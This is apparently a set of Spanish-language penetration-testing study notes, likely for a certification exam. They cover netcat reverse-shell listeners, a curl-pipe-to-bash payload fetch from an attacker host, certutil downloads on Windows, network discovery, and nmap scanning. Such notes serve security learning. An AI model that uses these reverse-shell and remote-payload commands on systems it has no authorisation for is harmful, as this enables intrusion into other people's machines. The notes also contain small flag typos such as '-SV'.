---
icon: '2'
---

# Conceptos Básicos de Hacking

## Uso de Netcat para entablar una Reverse Shell

La página **revshells.com** es una herramienta en línea que permite generar fácilmente comandos para establecer **Reverse Shells**. Solo debes ingresar la dirección IP de la máquina atacante y el puerto, y seleccionar el tipo de shell y el sistema operativo. También ofrece opciones avanzadas como diferentes tipos de listeners y codificación. Es útil para realizar pruebas de penetración o auditorías de seguridad.

Puedes acceder a la página aquí: [revshells.com](https://www.revshells.com/).

1. Poner el comando adecuado para la **Reverse Shell** en la máquina víctima.
2. &#x20;Nos ponemos en escucha a través del **puerto** de la Reverse Shell que hayamos puesto.

```bash
nc -lvnp <puerto>
```

### PHP Reverse Shell

Un sencillo shell reverso en PHP desarrollado por [Pentestmonkey](http://pentestmonkey.net).

Este es un shell reverso simple en PHP que puede utilizarse durante pruebas de penetración para obtener acceso a un servidor objetivo.

## Cómo Compartir Archivos Con Servidor Http Con Python + Reverse Shell

1. Crear un archivo que sea un **payload**.
2. Ejecutamos el comando en la máquina atacante a escuchar&#x20;

```bash
sudo nc -nlvp <puerto>
```

3. En la máquina víctima hacemos el siguiente comando

```bash
curl http://IP/archivo | bash
```

## Compartir Archivos por la Red en Máquinas Windows

Si no tenemos acceso a curl o a wget hay otra herramienta que es CertUtil.

1. Crear archivo.
2. En la máquina atacante poner este comando

```bash
python3 -m http.server 80
```

3. Abrir la cmd.
4. Poner el comando

```bash
certutil -split -urlcache -f http://192.168.0.20/archivo
```

## Reconocimiento de la red con ARP-SCAN o NETDISCOVER

### ARP-SCAN

Hay que saber la interfaz de red. Esto se sabe con el comando

```bash
ifconfig
```

```bash
arp-scan -I eth0 --localnet
```

> Nota: los sistemas virtualizados empiezan su MAC por 08:00

Al utilizar el comando `ping`, es útil revisar el valor del **TTL** (Time to Live), ya que este puede indicar el sistema operativo del equipo destino:

* Si el TTL es **128**, es probable que el equipo esté usando **Windows**.
* Si el TTL es **64**, es probable que el equipo esté usando **Linux**.

```bash
ping <dirección IP>
```

> **Nota**: El TTL puede variar si hay routers o saltos intermedios que alteren este valor.

### NETDISCOVER

```bash
netdiscover -i eth0 -r 192.168.0.0/24
```

Hay que poner en el último octeto un 0/24.

### NMAP

```bash
nmap -sn 192.168.0.0/24 -oN ips_disponibles.txt
```

## Escaneos Básicos con NMAP

```
nmap 192.168.0.39
```

```bash
nmap -p- --open -sS -sC -SV --minrate 5000 -n -vvv -Pn 192.168.0.39 -oN escaneo
```

> Nota: en el examen aunque vaya más lento poner 2000.

**Parámetros:**

* **`-p-`**: Escanea todos los puertos (desde el 1 hasta el 65535).
* **`--open`**: Muestra solo los puertos que están abiertos.
* **`-sS`**: Realiza un escaneo SYN, también conocido como "escaneo sigiloso" o "half-open".
* **`-sC`**: Ejecuta scripts NSE por defecto (para obtener más información sobre el servicio).
* **`-sV`**: Detecta la versión de los servicios en los puertos abiertos.
* **`--min-rate 5000`**: Establece una tasa mínima de 5000 paquetes por segundo (para acelerar el escaneo).
* **`-n`**: No realiza resolución DNS (evita convertir IPs en nombres de dominio).
* **`-vvv`**: Aumenta la verbosidad (muestra más información durante el escaneo).
* **`-Pn`**: Desactiva el escaneo de ping (asume que el host está activo).
* **`192.168.0.39`**: La IP de destino a escanear.
* **`-oN escaneo`**: Guarda los resultados en un archivo de texto llamado `escaneo`.

## Detectar Vulnerabilidades Con Nmap

```bash
nmap --script "vuln" -p<puerto> IP
```

## Escaneo de Puertos bajo el Protocolo UDP

```bash
nmap -sU --top-ports 200 --min-rate=5000 -Pn IP
```
